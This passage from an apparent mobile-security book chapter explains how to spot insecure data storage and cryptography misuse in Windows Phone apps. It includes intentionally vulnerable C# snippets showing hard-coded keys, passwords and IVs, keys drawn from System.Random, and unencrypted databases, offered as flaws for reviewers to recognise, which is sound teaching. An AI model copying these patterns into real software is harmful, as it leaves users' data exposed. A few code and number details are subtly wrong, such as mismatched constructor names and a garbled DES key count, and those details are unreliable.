device\nencryption enabled, and all data on the eMMC (flash storage module) could be extracted without difficulty from\na lost or stolen device.\nFurthermore, even if a Windows Phone device is encrypted, when the device is powered on, the filesystem is not\n“at rest”, and as such, successful attacks on the device would enable files to be extracted from the filesystem of\nthe switched-on device. It’s therefore vigilant from a security perspective that sensitive data stored by an app is\nstored in encrypted form, with proper key management practices in place, and data security should never rely on\ndevice encryption (BitLocker), which may or may not be enabled in the first place.\nUsing a capability-unlocked device with filesystem access, you can browse each app’s directory structure in\nsearch of interesting files that have been stored in their plaintext form. Files are most likely to be found in the\napp’s Local folder, or a subdirectory thereof, under C:\\Data\\Users\\DefApps\\APPDATA\\{GUID}\\Local, where\n{GUID} is the app’s identifier.\nIf you review an application that stores sensitive data to the filesystem without applying strong, industry-\nstandard cryptography (coupled with secure key management), it’s fair to say that this kind of storage method\nrepresents a security risk, which should ultimately be considered a bug. The risk is particularly ever-present for\ndevices that do not have device encryption enabled, which at the time of writing is all devices that are not\nenterprise enrolled. For an attacker with physical access to an unencrypted device, accessing the sensitive data\nwould be as easy as removing the eMMC from the device, mounting it, and then browsing the filesystem.\nOther attacks such as privilege escalation, sandbox breaches, and remote attacks (think drive-by browser\nattacks) essentially render device encryption irrelevant, because data is not at rest; hence in all cases, it should\nbe considered that sensitive data should always be encrypted by the app itself that is storing it.\nInsecure Database Storage\nIn regard to data that is best stored in a much more relational and structured way, a database is a common\nsolution for all kinds of apps. Windows Phone apps are no exception.\nOf course, at least in the context of Windows Phone, most databases are in reality stored to the device as files.\nWe discuss this as an implementation issue on its own instead of in the previous section, because databases\nencompass a group of storage technologies in their own right.\nTwo families of databases find common usage in Windows Phone apps: local databases, which are Windows\nPhone’s standard native databases, and SQLite databases.\nIn apps that use either of these two database types (or both), sometimes encryption is applied to the database,\nand sometimes it is not. Even when cryptography is used in an effort to keep databases safe, developers make\nsome common mistakes that only superficially protect data, leaving it only slightly more secure than if it were\nstored in plaintext—think insecure key management (including hard-coded keys).\nWe’ll discuss each of the two database families and how to spot when insecure database storage has been\nimplemented, including some instances in which cryptography has been employed.\nLocal Databases\nWindows Phone provides standard interfaces to create, manipulate, and access databases that are known as\n“local databases”. Developers do not drive these databases via SQL queries directly, but instead by Language\nIntegrated Query (LINQ), which is a .NET component that adds data querying capabilities to the .NET\nlanguages.\nUnder the hood, local databases are still SQL based, but Windows Phone does not expose interfaces for talking\nto databases using raw queries. Instead, a LINQ-to-SQL layer converts LINQ queries on databases into SQL\nqueries, and the database is driven in this way, with the LINQ-to-SQL layer acting as a translation interface or\nproxy. In fact, no public APIs exist for making SQL queries on databases.\nThe entire LINQ-to-SQL architecture is quite different from what developers brought up on SQL are used to, but\nthe LINQ-to-SQL paradigm is object oriented and provides powerful methods for accessing and manipulating\ndata when you understand some core concepts and patterns.\nFor a general introduction on Windows Phone local databases, LINQ-to-SQL, and its architecture, study the\nMSN article located at http://msdn.microsoft.com/en-\nus/library/windows/apps/hh202860(v=vs.105).aspx#BKMK_UsingtheDatabase; a full introduction to local\ndatabases/LINQ-to-SQL is beyond the scope of this chapter. We do, however, cover some basics of Windows\nPhone local databases here so that you will be able to identify instances of insecure data storage when databases\nare being used.\nUse of a local database in a Windows Phone app begins with the definition of a data context. You do this\nprogrammatically by defining a class that extends the DataContext class. You then define additional classes to\nspecify the table and column structure of the database, using the [Table] and [Column] attributes appropriately.\nFor example, an HR application could define a database to hold information on the company’s employees, using\ncode such as the following:\npublic class EmployeeDataContext : DataContext\n{\npublic TaskDataContext(string connectionString)\n: base(connectionString)\n{\n}\npublic Table<Employee> Employees;\n}\n[Table]\npublic class Employee\n{\n[Column(IsPrimaryKey = true, IsDbGenerated = true, DbType =\n\"INT NOT NULL Identity\", CanBeNull = false, AutoSync = AutoSync.OnInsert)]\npublic string PersonName { get; set; }\n[Column]\npublic string JobTitle { get; set; }\n[Column]\npublic string PhoneNumber { get; set; }\n[Column]\npublic string EmailAddress { get; set; }\n[Column]\npublic string HomeAddress { get; set; }\n[Column]\npublic DateTime EmploymentStartDate { get; set; }\n}\nThe preceding EmployeeDataContext class definition declares that the database should have one table, which is\nstructurally defined by the Employees class, defined below it. The Employees class, marked as a table definition\nby the [Table] attribute, essentially defines a table that has columns for an employee’s full name, job title,\nphone number, email address, home address, and employment start date. All of these are aptly marked using the\n[Column] attribute, and their full name is marked as being a primary key for insertions and queries.\nNotice the EmployeeDataContext class’s constructor definition:\npublic TaskDataContext(string connectionString)\n: base(connectionString)\n{\n}\nInterpreting the TaskDataContext constructor above, whenever an instance of the TaskDataContext class is\ninstantiated, TaskDataContext’s constructor immediately passes its string argument to the constructor its base\nclass, DataContext. This string, incidentally, is the database’s connection string; this must be passed to the base\nclass (DataContext) to successfully connect to the database (or to create the database, if the database is being\nused for the first time).\nSo, for example, when a developer wishes to use their database, or create a database representable by the\nEmployeeDataContext for the first time, they could use code similar to the following:\nEmployeeDataContext db = new EmployeeDataContext(\"isostore:/EmployeeDB.sdf\");\nIf(db.DatabaseExists() == false) {\nDb.CreateDatabase();\n}\nThe preceding code attempts to connect to the database named EmployeeDB .sdf (which will be in the app’s\nLocal folder), and if the database does not already exist, it will create it.\nThe string passed to EmployeeDataContext, that is, isostore:/EmployeeDB.sdf, is the database’s connection\nstring, which the class will pass on to DataContext upon new EmployeeDataContext object instantiation.\nHowever, note in the preceding example code where the connection string passed to the data context class was\nisostore:/EmployeeDB.sdf, that no password is specified in the connection string. Thus the created database\nwould be completely unencrypted, unless the application itself manually encrypts data before its submission to\nthe database. If sensitive data is being stored in a local database that is created without a password in its\nconnection string, then this in itself constitutes a security issue.\nThe local database API supports passwords being used in connection strings. Use of a password in the\nconnection string during database creation results in the database’s contents being AES-128 encrypted, with the\nkey being generated by SHA-256 hashing the given password. An encrypted employee database could be created\nusing a data context definition as follows, with the password being MySecretDbPassword.\nEmployeeDataContext db = new EmployeeDataContext(\"Data\nSource='isostore:/EmployeeDB.sdf';Password='MySecretDbPassword'\");\nif(db.DatabaseExists() == false) {\ndb.CreateDatabase();\n}\nAlthough the database will indeed be AES-128 encrypted in the preceding case, the password being used is hard-\ncoded into the connection string. This in itself also represents a security risk, because all users of the app will\nhave a database encrypted with exactly the same key. This offers little more protection than having no\ncryptography applied to the database at all, because any attacker able to reverse-engineer the app will glean\nknowledge of the hard-coded password that is used in all cases. Unfortunately, hard-coded keys and passwords\nare quite common in mobile apps for all platforms, in addition to those for Windows Phone.\nEven if a database password is not hard-coded, but is instead derived from system constants such as the\nDeviceUniqueId, you should again consider it a security issue if the stored data is sensitive, because the\npassword may be easily derived by an attacker.\nDatabase passwords should not be hard-coded, and should not be derivable from system data from the device\n(such as from a MAC address, or from DeviceUniqueId, for example). Instead, they should be derived from a\nsecret phrase known only by the user, such as using PBKDF2 (Password-Based Key Derivation Function, 2).\nLocal databases are stored in an app’s Local folder, and often have the .sdf file extension, so checking for\nunencrypted databases manually is easy to do using full filesystem access that has been gleaned via capability\nunlocking.\nSQLite-Based Databases\nThe standard SQLite distribution for Windows Phone does not support cryptography out of the box, so sensitive\ndata being stored in a SQLite database created and managed by the standard package is likely to represent a\nsecurity risk.\nHowever, two fairly well-used SQLite packages do support cryptography; namely, SQLCipher and the SQLite\nEncryption Extension (SEE). Both of these packages require licenses to use and are not freeware. SEE supports\nAES-128, AES-256, and RC4, whereas SQLCipher solely uses AES-256.\nTo create a database (and subsequently use it thereafter) with encryption using SQLCipher, developers must use\nthe SetPassword() method on their SQLiteConnection object, like so:\nstring connectionString = \"Data\nSource=sqlcipher.db;Pooling=false;Synchronous=Full;\";\nstring password = \"password123\";\nusing(var conn = new SQLiteConnection(connectionString)) {\nconn.SetPassword(password);\nconn.Open();\n[ ... ]\nWhen using SEE (SQLite Encryption Extension), applications specify a key using the PRAGMA statement after\ninstantiating their SQLiteConnection object, as in:\nstring connectionString = \"Data\nSource=sqlcipher.db;Pooling=false;Synchronous=Full;\";\nstring password = \"password123\";\nusing(var conn = new SQLiteConnection(connectionString)) {\nconn.Execute(String.Format(\"PRAGMA key='{0}';\", password);\n[ ... ]\nIn both use cases (SEE and SQLCipher), if an application uses a static hard-coded password for a sensitive\ndatabase, or the password is somehow derived from non-secret data (such as DeviceUniqueId), this should be\nconsidered a security issue. Of course, you should also consider sensitive data being stored without a password a\nbug.\nSQLite databases are generally stored in the app’s Local folder and tend to have the .db file extension. You can\ncheck databases extracted from a device for cryptography using the sqlite3 application, using a hex editor, or by\nanalyzing the output of the strings mydatabase.db.\nInsecure Random Number Generation\nUsing cryptographically random data is important in security-critical applications, so that data derived from the\nentropy source can be relied on in security-sensitive situations.\nOne particular situation when secure generation of random data is important is in generation of cryptography\nkeys. The reason why, of course, is quite obvious: If cryptography keys are predictable to an attacker, the key\nmay be discovered, and the data protected by the key may be decrypted.\nWindows Phone exposes two main APIs that may be used for generating random data: System.Random and\nRNGCryptoServiceProvider. System.Random should not be used for generating cryptography keys, passwords, or\nother similar security-sensitive values that need to be cryptographically random. In short, consider the use of\nthe System.Random API in these contexts (such as for cryptography key generation) a security vulnerability. We\ndiscuss why in the coming subsections.\nSystem.Random’s Predictability\nSystem.Random is provided by the .NET Framework to generate pseudo-random data that is admittedly not\ncryptographically random. The System.Random API suffices for some purposes, but should not be used to\ngenerate security-sensitive values such as cryptography keys.\nTo use the System.Random class, an application first instantiates a new Random object—either with a seed, or\nwithout specifying a seed. For instantiation, System.Random exposes the following two constructors:\nRandom()\nRandom(Int32 seed)\nThe default constructor, Random(), is parameterless, and hence doesn’t take a seed. When this constructor is\nused, the Random object is seeded with the current system uptime—Environment.TickCount—which has\nmillisecond resolution. You can see this by analyzing the source code for System.Random, which is available on\nMicrosoft’s Reference Source website (http://referencesource .microsoft.com/#mscorlib/system/random.cs):\n//\n// Constructors\n//\npublic Random()\n: this(Environment.TickCount) {\n}\npublic Random(int Seed) {\nint ii;\nint mj, mk;\n[ ... ]\n}\nThe other constructor, Random(Int32 seed), accepts a seed as its 32-bit integer parameter, and uses this to seed\nthe Random object.\nThe developer can then call one of the class’s member methods to retrieve pseudo-random data from the object.\nSystem.Random exposes the following methods for pulling out random data:\nNext()—Returns a non-negative pseudo-random integer\nNext(Int32)—Returns a non-negative pseudo-random integer that is less than the specific maximum\nNext(Int32, Int32)—Returns a non-negative pseudo-random integer that is within the specified range\nNextBytes(byte[])—Fills the specified byte array with random bytes\nNextDouble()—Returns a pseudo-random double\nSample()—Returns a pseudo-random floating-point number between 0.0 and 1.0\nSo, for example, a less-than-perfect application may generate a 32-byte cryptography key, and therefore call into\nthe Random API using code such as the following:\nRandom rnd = new Random(1234); // 1234 as the seed\nbyte[] encKey = new byte[32];\nrnd.NextBytes(encKey);\nOr, the developer may opt to use Random's default constructor and not specify a seed, such as:\nRandom rnd = new Random(); // uptime in milliseconds as seed\nbyte[] encKey = new byte[32];\nrnd.NextBytes(encKey);\nTo the untrained eye, both of these may look fine and appear to work as expected; they both generate data that\nseems to be random, at a glance, perhaps. However, each case is in reality insecure; the problem with\nSystem.Random is that two Random object seeded with identical seed values always produce the same sequence of\n“random” numbers as their output. In other words, if a Random object is seeded with 1234, the output will be\nexactly the same as for another Random object seeded with 1234.\nClearly, this is particularly bad for generating security-sensitive values like cryptography keys, because if you\nseed the value you can predict the output of a System.Random object.\nIntuitively, this situation is at its worst if the app manually specifies a static or deterministic seed value, as in\nthe following example:\nRandom rnd = new Random(STATIC_SEED_VALUE);\nThis is because the seed value can be determined by all attackers who reverse-engineer the application or have\nknowledge of some system values, such as the MAC or IP addresses.\nHowever, even if the default constructor is used as shown here,\nRandom rnd = new Random();\nthe system uptime in milliseconds is used as the seed. This is insecure, because Environment.TickCount is quite\npredictable.\nAs a matter of fact, only 86.4 million milliseconds are in a 24-hour day. Therefore, simply knowing on which day\na key (or otherwise) was generated by Random would enable you to determine the generated value by trying all\n86.4 million possible values as the seed. Additionally, just because Environment.TickCount has millisecond\nresolution, Environment.TickCount doesn’t change every millisecond. Changes to TickCount every 15\nmilliseconds may be typical, for example (see\nhttp://blogs.msdn.com/b/pfxteam/archive/2009/02/19/9434171.aspx). This is likely to narrow down the seed\nsearch space even further.\nThe point here is that for a given seed value, the output of a System.Random object will always be the same; this\npredictability of output for each particular seed value is obviously insecure, and for this reason, System.Random\nshould never be used for generating security-related values, such as cryptography keys.\nThe right API to use for cryptographic and other security purposes, as it were, is RNGCryptoServiceProvider; we\ncover the use of this API in detail in the next chapter’s section, “Generating Random Numbers Securely”.\nMultiple Instances of System.Random\nSuppose that a developer wants to generate a collection of random numbers. The unsuspecting developer may\nwrite code like the following:\nint[] randData = new int[32];\n// generate random ints\nfor(int count = 0; count < 32; count++) {\nRandom rnd = new Random();\nrandData[count] = rnd.Next();\n}\nIn this piece of code, a new instance of Random is instantiated for each subsequent number generation, with\nEnvironment.TickCount being used as the seed. However, because Environment.TickCount has millisecond-\nmagnitude resolution (though not necessarily 1 millisecond), it is very likely that the code will fill randData with\nall the same integer. In fact, in a tight loop, the same integer may be generated thousands of times before\nEnvironment.TickCount eventually changes and the new Random objects are seeded with a different value.\nMisuse of Random in this way can clearly have some detrimental consequences if the data needs to be\ncryptographically secure.\nSimilarly, consider that a developer did something similar, but instead specified a seed when he instantiated\nRandom objects, for example:\n// generate random ints\nint[] randData = new int[32];\n// generate random ints\nfor(int count = 0; count < 32; count++) {\nRandom rnd = new Random(1234);\nrandData[count] = rnd.Next();\n}\nThis code would actually fill the randData array with 32 identical integers because System.Random returns the\nsame sequence of numbers every time a given seed is used. Given that the preceding code is instantiating a new\nRandom object for every number, the first number in the sequence will be outputted every time.\nSystem.Random Thread Safety\nSystem.Random is not thread safe, and a Random object should not be used by multiple threads without using a\nsynchronization object for locking.\nIf a Random object is accessed by multiple threads in a thread-unsafe way, any of its methods (such as Next(),\nNextBytes(), and so on) may begin to return 0 every time they are called. In this case, if an object is used by\nmultiple threads simultaneously, this could conceivably result in a cryptography key composed mostly or\nentirely of '\\0' bytes, which would have obvious negative security side effects.\nCode such as the following may result in 0s being emitted by the Random object, on multicore devices:\nRandom rand = new Random();\nint[] randInts = new int[32];\nParallel.For(0, 32, (i, loop) =>\n{\nrandInts[i] = rand.Next();\n});\nNon-thread safe characteristics present yet another reason to avoid System.Random altogether when\ncryptographically secure data is required. As mentioned before, the correct API to use for security purposes is\nthe RNGCryptoServiceProvider class, the use of which we cover in full in the Chapter 13 section, “Generating\nRandom Numbers Securely.”\nInsecure Cryptography and Password Use\nMost people involved with security realize that sensitive data should be stored or transferred in encrypted\nformat, instead of in its easily accessible plaintext format. However, simply encrypting data is the tip of the\niceberg; many ways exist to implement cryptographic storage (or transfer) that falls short in terms of security,\nand this can partially or completely undermine the security that cryptography could otherwise have provided.\nThe general category of “insecure cryptography and password use” does not represent one class of bug, but\nseveral. For example, bad key management provides a number of ways to introduce vulnerabilities.\nProper key management is central to securely implementing cryptography in applications. The security of\nencrypted data relies heavily on cryptography keys being unknown to those who would illegitimately like access\nto the data. Thus, failure to generate keys securely and then protect them can result in the compromise of\nencrypted data. We cover some of the common ways in which developers mismanage cryptography keys (and\npasswords) and introduce security vulnerabilities when implementing cryptographic storage or transfer in their\napplications.\nHard-Coded Cryptography Keys\nEven with security now being a widespread concern, it’s still quite common to see apps encrypting data and\nstoring (or transferring) data using cryptography keys that are simply hard-coded into the app.\nWhen reviewing an app’s code (original or reversed) you may come across code that defines a static\ncryptography key used later for encrypting important and sensitive data. For example, consider the following\ncode fragment in which the app defines a static 32-byte key, which it uses for encryption of some sensitive data,\nthe resulting ciphertext for which is stored to a file in its Local directory:\nchar[] cryptoKey = { 0x10, 0x20, 0x30, 0x40, 0x45, 0x78, 0x65,\n0x61, 0x62, 0x43, 0x69, 0x35, 0x32, 0x15, 0x20, 0x50, 0x10, 0x20,\n0x30, 0x40, 0x45, 0x78, 0x65, 0x61, 0x62, 0x43, 0x69, 0x35, 0x32,\n0x15, 0x20, 0x50 };\n[ ... ]\nretval = EncryptData(secretData, cryptoKey, out encryptedData);\nretval = StoreEncryptedData(encryptedData, filePath);\nAlthough the resulting data will indeed be encrypted, any attacker able to reverse-engineer the application\nbecomes privy to the key. Because the key is hard-coded into the app, all users of the app will have their data\nencrypted with exactly the same key.\nAll the attacker needs to do after discovering the hard-coded key is to extract encrypted files from the target\ndevices and proceed with decryption using that static key. It goes without saying that the use of hard-coded keys\nis essentially never acceptable for sensitive data.\nInsecure Storage of Cryptography Keys\nAnother common security failure is when apps safely generate per-user cryptography keys, but then store them\nin their filesystem sandbox in cleartext format. Some apps attempt to hide the key(s) or obfuscate them to deter\ncasual or unskilled attackers, but this rarely offers any genuine extra security.\nLikewise, some apps that make use of public key cryptography to store their private key to their filesystem\nsandbox—schematically:\nstring cryptoKey = GenerateCryptoKey();\nStoreCryptoKeyToFile(cryptoKey);\nIn any case, any attacker able to access the device’s filesystem will be able to extract the key(s), which he can\nthen use to recover encrypted data that is protected by the key.\nWhen performing a review of an app’s cryptographic practices, pay close attention to whether keys are being\nstored, and keep in mind that storage of private keys and symmetric keys are security issues, assuming the\nprotected data is sensitive.\nOf course, secure ways exist for storing cryptography keys. We discuss them in Chapter 13 in the section “Secure\nKey Management.”\nStoring Keys and Passwords in Immutable String Objects\nAlthough cryptography keys themselves are rarely stored in string objects due to their binary nature, password-\nbased key derivation schemes (such as Password Based Key Derivation Function 2, or PBKDF2) commonly deal\nwith the password in the form of a string.\nFor example, to generate a cryptography key, an app may accept a password from the user, read it into a string\nobject, and then pass that object to its PBKDF2 method to go ahead and generate the key. In pseudo-code, this\ncould be represented as:\nstring password = ReadPasswordFromPasswordBox();\n[ ... ]\nPBKDF2_GenKey(password, iterations, out cryptoKey);\nThis works fine functionally but the problem from a security perspective is that after the password has been\nstored in the string object, this value cannot be overwritten at will. This poses a problem if an attacker is able to\ndump memory out of the process; ideally, you should clear the password from memory as soon as it is not\nneeded anymore.\nClearing a string, however, is not easily done. String objects are immutable, meaning that after the object’s\nvalue is set, it cannot be changed. You would be forgiven for assuming that the following results in myStr’s value\nbeing changed to \"overwritten\":\nstring myStr = \"value1\";\nmyStr = \"overwritten\";\nIn actual fact, it does not; the preceding code simply changes the string object that myStr references; the\n\"value1\" string object may still exist, until garbage collection.\nThe Common Language Runtime (CLR) is also likely to make new copies of string objects when they are passed\ninto other methods, making memory disclosure and forensics attacks more likely to succeed.\nBecause you cannot easily wipe passwords stored in string objects, you would be vigilant to consider instances\nof password storage in strings to be a vulnerability, particularly in security-critical applications. Typical attack\nvectors include memory disclosure bugs and memory forensics investigation on a device.\nTo guard against memory disclosure and memory forensic attacks, store all passwords not in immutable string\nobjects (which cannot be overwritten), but in char[] or byte[] arrays that can be zeroed in a for() or while()\nloop when they are no longer needed. We discuss this topic in the following section.\nFailure to Clear Cryptography Keys and Passwords from Memory\nWhen apps use cryptography, the key needs to be in memory in the app’s address space at some point. For apps\nthat require a high level of security, however, cryptography keys should be wiped from memory as soon as they\nare no longer needed, or when they are not needed again for some time; you should also apply this same\nprinciple for passwords. The purpose of clearing cryptography keys and passwords from the app’s address space\nis to help protect against successful memory disclosure and forensics attacks, and in fact, wiping cryptography\nkeys is required to be compliant to certain security specifications, including some Federal Information\nProcessing Standards (FIPS) specifications.\nPractically, this means that after a key has been used and is not needed again in the near future, the app should\noverwrite it to (hopefully) erase it from the runtime’s memory.\nIf the app actively needs the key (that is, it’s having a conversation via a custom-encrypted protocol), then\noverwriting it is obviously not going to be feasible. When an app only needs to use the key for a batch of\noperations, we recommend that the key be wiped promptly afterwards.\nIn apps where wiping is feasible from a usability and performance standpoint, cryptography keys and passwords\nshould generally be stored in char[] or byte[]arrays and then wiped when no longer needed, as demonstrated\nhere:\nfor(int i = 0; i < KEYLEN; i++)\ncryptoKey[i] = 0;\nIn sensitive apps (that is, banking), failure to implement such a key and password clearing policy may be\nconsidered a security issue. Of course, usability and performance are also important in many applications, so if\nan app needs to persist a key or password because it uses it often, then ultimately this requirement may need to\noverrule security.\nInsecure Key Generation\nSecure key generation is another critical part of implementing an acceptably secure system of cryptographic\nstorage or communications within an app. Failure to securely generate keys can result in these keys being\npredictable or otherwise weak, so we’ll look at ways in which apps may insecurely generate keys, and how you\ncan spot them in a Windows Phone app security review.\nInsecure Random Key Generation\nSome cryptography keys are generated using pseudo-random number generation APIs. However, you must use a\nsecure pseudo-random number generator (PRNG) and use it properly.\nIn the context of Windows Phone apps, this means that the System.Random class should never be used to\ngenerate cryptography keys, because output data from System.Random is not cryptographically random. You\nshould consider the use System.Random to generate cryptography keys a security issue.\nWe covered this topic earlier in this chapter. (See “Insecure Random Number Generation” for more detail on the\nsubject of auditing for insecurely generated random cryptography keys.)\nInsecure Password-Based Key Generation and Password Policy\nThe other main way of generating cryptography keys (in addition to via pseudo-RNG sources) methods is via a\npassword-based key generation scheme.\nAs the phrase suggests, password-based key generation schemes take a password usually provided by the user,\nand generates a cryptography key from it. The implementation details of these popular schemes vary.\nThe simplest conceivable way of generating a cryptography key from a password is to simply convert the\npassword to a byte array, and use that as the cryptography key. There are, however, several problems with this\nidea. First, assuming 256-bit cryptography, the password would need to be 32-bytes long, which would present\nproblems for most users.\nThe second problem relates to the resulting keyspace of keys generated in this way. In general, passwords\ncontain only printable characters; a–z, A–Z, 0–9, and some special characters (for example, !, #, $, and so on).\nThis limits the usable value for each character to around 75, out of the 256 values that a one-byte character can\ntake. So keys made up from passwords directly allow much less entropy than could be achieved by allowing all\npossible 256 values that one-byte characters can assume.\nMoving a step further in sophistication, some developers may generate a 256-bit key by hashing the user’s\npassword using SHA-256. The main problem with this is that SHA-256 is a very fast hashing algorithm; an\nattacker with a lot of computational power at his disposal (think Graphics Processing Units— GPUs) can\npotentially generate billions of hashes per seconds, which translates to billions of password brute-force guesses\nper second in an attempt to find your cryptography key. SHA-256 is also unsalted.\nWith that being said, it’s understandable that other methods of generating cryptography keys using a user-\nsupplied password are sought.\nGood password-based key generation APIs work using hash functions over (potentially) many iterations, or\nallow the developer to specify a “cost factor,” and they also involve salts and other time-consuming\nmanipulation steps. In general, the more iterations that are used, or the more costly it is to generate a key from\na given password, the better (within usability constraints!).\nThe reason for this lies in making a password brute-force attack to find the correct cryptography key time\nconsuming for an attacker; if he can only generate a few thousand keys per second, he can only attempt\ndecryption with a few thousand keys per second. His attack will therefore take significantly longer than if the\nkey were generated by just SHA-256 hashing the user’s password, which could allow billions of key outputs and\ntherefore decryption attempts on the victim’s data per second.\nGood algorithms for password-based key generation also use large random salts to ensure that the user’s\npassword is hashed uniquely.\nA description and survey of password-based key generation APIs are beyond the scope of this chapter, but\nunderstanding which methods of key generation from passwords are secure, and which are not, is important so\nthat you can spot the usage of insecure methods in code reviews.\nWhen apps use password-based key derivation, the use of the following APIs, when used correctly as per the\nguidelines below, are considered acceptably secure from a cryptographic point of view:\nPBKDF2 (http://en.wikipedia.org/wiki/PBKDF2)—With SHA-256, at least 10,000 iterations\nBcrypt (http://en.wikipedia.org/wiki/Bcrypt)—With 10-byte random salt, with a cost factor of at least 10\nScrypt (http://en.wikipedia.org/wiki/Scrypt, http://www.tarsnap .com/scrypt.html)—Recommended\nparameters by the author, Colin Percival, are N = 2^20, r = 8, and p = 1. These are considered sensible for key\ngeneration for sensitive data storage\nAll of these algorithms are purposefully slow to make an attacker much less likely to succeed in brute-forcing\npasswords to find your cryptography key.\nTreat the use of any other algorithms for password-based key generation as a security issue; apps should not\nattempt to “roll their own” cryptography-related code, in general, and should avoid using other peoples’\nattempts, no matter how complex or secure the algorithm may look.\nIn addition to simply using an industry-standard key generation algorithm in applications, you must consider\nanother important factor to ensure secure applications; password policy. Even if the app uses PBKDF2 with a\nhigh iteration count, if the password were something like “aaaa”, then a dictionary attack will usually succeed\nquite quickly. To prevent users from undermining the security of their own data, apps encrypting sensitive data\nshould enforce a password policy. Reasonable complexity guidelines that allow a middle ground between\nsecurity and usability include the following:\nHave at least eight characters\nUse both uppercase and lowercase characters\nInclude one number\nInclude one special character\nWhen an app is encrypting, storing, or transferring sensitive data, you should consider the failure to implement\na password policy to be a security issue.\nChapter 13 provides a discussion on the implementation of secure password hashing.\nUse of Weak Cryptography Algorithms, Modes, and Key Lengths\nEven when keys are well generated and managed, encrypted data can be at risk due to the choice of cryptography\nalgorithm; some algorithms have simply been proven to be insecure, or were not intended for encryption of\nsensitive data in the first place.\nMany encryption algorithms are not actually fit for protecting sensitive information, but we’ll discuss a few that\nare used, and should not be. These include DES Data Encryption Standard (DES), RC4, AES in ECB Electronic\nCodebook (ECB) mode, and obviously XOR encryption schemes.\nData Encryption Standard (DES)\nDES uses a key length of 56-bits, giving a search space of 256 different keys. With modern computing power,\ncracking a piece of a DES key is completely feasible. Known Plaintext and Chosen Plaintext attacks have also\nbeen shown to be possible, which could further reduce the time necessary to crack a DES key, when a very large\nnumber of plaintexts are available (http://en.wikipedia\n.org/wiki/Data_Encryption_Standard#Attacks_faster_than_brute-force). Further information is available\nonline, such as at the DES Wikipedia page at http://en.wikipedia.org/wiki/Data_Encryption_Standard.\nSimply put, for storing sensitive data, avoid DES. Consider the use of it for sensitive data to be a bug.\nSpotting the use of DES in a code review is generally simple: Look for use of the DESCryptoServiceProvider, or\nits base class, System.Security.Cryptography.DES. Other third-party libraries, such as BouncyCastle, could\npotentially be used; spotting DES use should be simple in these cases, as well.\nAES in ECB Mode\nAES has a number of different modes, including ECB Electronic Codebook (ECB), Cipher Block Chaining (CBC),\nand counter mode (CTR).\nIn short, ECB treats each block independently from all other blocks, so identical blocks of plaintext are\nencrypted into identical blocks of ciphertext every time. This makes pattern analysis attacks on encrypted data\nblobs possible.\nThe best demonstration of the dangers of using AES in ECB mode is via the classic “Tux the Penguin” case\nstudy. When a TIFF image of Tux the Penguin was encrypted using AES in ECB mode, pattern analysis attacks\non the resulting ciphertext allowed the basic outline of the original image to be recovered. See the original image\nin Figure 12.3.\nFigure 12.3 Original image of the Linux mascot, Tux the Penguin\nCompare this to the recovered image in Figure 12.4, which shows the general outline and even some details\npossessed by the original Tux the Penguin image.\nFigure 12.4 Recovered image of Tux the Penguin\nIt should be evident from these two images that AES in ECB mode should not be used for storing sensitive data.\nUse of AES in ECB mode is easily spotted; look for the use of the System .Security.Cryptography.Aes class, or\nits two subclasses System.Security .Cryptography.AesCryptoServiceProvider and System.Security\n.Cryptography.AesManaged.\nAll three of these classes have a property named Mode property. If Mode is set to CipherMode.ECB, ECB mode will\nbe used.\nOther Weak Algorithms\nA number of other weak algorithms are in fairly common usage that should not be used for the protection of\nsensitive data, some of which include\nXOR schemes\nTiny Encryption Algorithm (TEA)\nRC4\nUse of any other “homegrown” or otherwise little-known algorithms probably represents a security issue. Apps\ndealing with sensitive data should stick to the industry-strength algorithms such as AES (in modes other than\nECB).\nMinimum Public-Private Key Length\nAt the time of this writing, the recommended RSA key length when using public-private key asymmetric\nencryption is 2048. You should consider the use of 1024-bit keys to be against security best practices, and be\nconcerned about the use of 512-bit keys.\nUse of Static Initialization Vectors\nEvery block cipher mode besides ECB uses what is known as an Initialization Vector (IV). The high-level\npurpose of an IV is to ensure that encryption results vary every time; that is, when identical blocks of data are\nencrypted with the same key, use of a different IV means that the resulting ciphertext will be different in each\ncase.\nThis means that apps using non-ECB modes for block encryption should never use hard-coded IVs, and IVs\nshould be randomly generated to ensure their uniqueness. Using predictable or hard-coded IVs allows Chosen\nPlaintext attacks. To read more details on Chosen Plaintext attacks, the following URL may be of interest:\nhttp://cryptography.stackexchange.com/questions/1312/using-a-non-random-iv-with-modes-other-than-\ncbc/1314#1314.\nIVs do not need to be secret. In fact, they cannot be, because they are needed to decrypt an encrypted blob. They\nsimply need to be unique to prevent Chosen Plaintext attacks on encrypted data.\nUse of a hard-coded IV constitutes a security vulnerability, as does generation of an IV using an insecure\nrandom number generator such as System.Random; for example:\nchar[] iv = { 0x10, 0x20, 0x30, 0x40, 0x45, 0x78, 0x65, 0x61, 0x62,\n0x43, 0x69, 0x35, 0x32, 0x15, 0x20, 0x50 };\nThe preceding in cryptography code (an AES-256, for example) would be cause for concern because the IV is\ncompletely static, as would the following:\nRandom rnd = new Random(); // uptime in milliseconds as seed\nbyte[] iv = new byte[16];\nrnd.NextBytes(iv);\nbecause iv may be predictable given the flawed nature of System.Random.\nBoth of the preceding examples are contrary to cryptography best practices.\nYou should generate IVs using a cryptographically secure random number generator. (See Chapter 13 for more\ninformation on the secure generation of IVs.)\nData Protection API Misuse on Windows Phone\nThe Data Protection API, or DPAPI, is a cryptographic API provided by Windows for the purpose of encrypting\narbitrary data blobs. DPAPI is used by a large number of third-party and Microsoft applications and frameworks.\nMicrosoft uses DPAPI in the following pieces of software and use cases, to name a few examples:\nFilesystem encryption\nInternet Explorer autocomplete settings\nOutlook credentials\nWireless passwords\nDPAPI is also available on the Windows Phone 8.x platforms, in addition to standard Windows. DPAPI is\nrecommended by Microsoft as a standard way of encrypting and decrypting data on the Windows platforms.\nDPAPI exposes two native interfaces: one for encrypting data, and one for decrypting data. Namely, these APIs\nare CryptProtectData()and CryptUnprotectData(). These are native methods and have the following function\nprototypes,\nBOOL WINAPI CryptProtectData(\n_In_ DATA_BLOB *pDataIn,\n_In_ LPCWSTR szDataDescr,\n_In_ DATA_BLOB *pOptionalEntropy,\n_In_ PVOID pvReserved,\n_In_opt_ CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,\n_In_ DWORD dwFlags,\n_Out_ DATA_BLOB *pDataOut\n);\nand:\nBOOL WINAPI CryptUnprotectData(\n_In_ DATA_BLOB *pDataIn,\n_Out_opt_ LPWSTR *ppszDataDescr,\n_In_opt_ DATA_BLOB *pOptionalEntropy,\n_Reserved_ PVOID pvReserved,\n_In_opt_ CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,\n_In_ DWORD 